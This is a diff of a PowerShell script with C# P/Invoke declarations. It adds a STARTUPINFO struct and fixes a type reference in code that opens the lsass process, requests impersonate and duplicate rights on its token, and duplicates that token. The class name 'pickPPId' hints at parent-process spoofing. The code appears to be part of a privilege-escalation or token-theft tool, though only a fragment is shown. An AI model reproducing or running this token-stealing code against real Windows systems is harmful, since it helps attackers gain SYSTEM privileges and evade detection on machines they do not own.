@@ -103,6 +103,29 @@ $signature = @"
         ref TokPrivLuid newst, int len, IntPtr prev, IntPtr relen);
      
     [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
+        public struct STARTUPINFO
+        {
+            public uint cb;
+            public string lpReserved;
+            public string lpDesktop;
+            public string lpTitle;
+            public uint dwX;
+            public uint dwY;
+            public uint dwXSize;
+            public uint dwYSize;
+            public uint dwXCountChars;
+            public uint dwYCountChars;
+            public uint dwFillAttribute;
+            public STARTF dwFlags;
+            public ShowWindow wShowWindow;
+            public short cbReserved2;
+            public IntPtr lpReserved2;
+            public IntPtr hStdInput;
+            public IntPtr hStdOutput;
+            public IntPtr hStdError;
+        }
+
+    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
         public struct STARTUPINFOEX {
             public STARTUPINFO StartupInfo;
             public IntPtr lpAttributeList;
@@ -142,7 +165,7 @@ $signature = @"
 
     $process = (Get-Process -Name lsass) 
     [IntPtr]$hlsasstoken = [IntPtr]::Zero 
-    $retVal = $pickPPId::OpenProcessToken($process.Handle, ([$pickPPId]::TOKEN_IMPERSONATE -BOR [$pickPPId]::TOKEN_DUPLICATE), [ref]$hlsasstoken) 
+    $retVal = $pickPPId::OpenProcessToken($process.Handle, ([pickPPId.pickPPId]::TOKEN_IMPERSONATE -BOR [pickPPId.pickPPId]::TOKEN_DUPLICATE), [ref]$hlsasstoken) 
 
     [IntPtr]$dulicateTokenHandle = [IntPtr]::Zero 
     $retVal = $pickPPId::DuplicateToken($hlsasstoken, 2, [ref]$dulicateTokenHandle) 
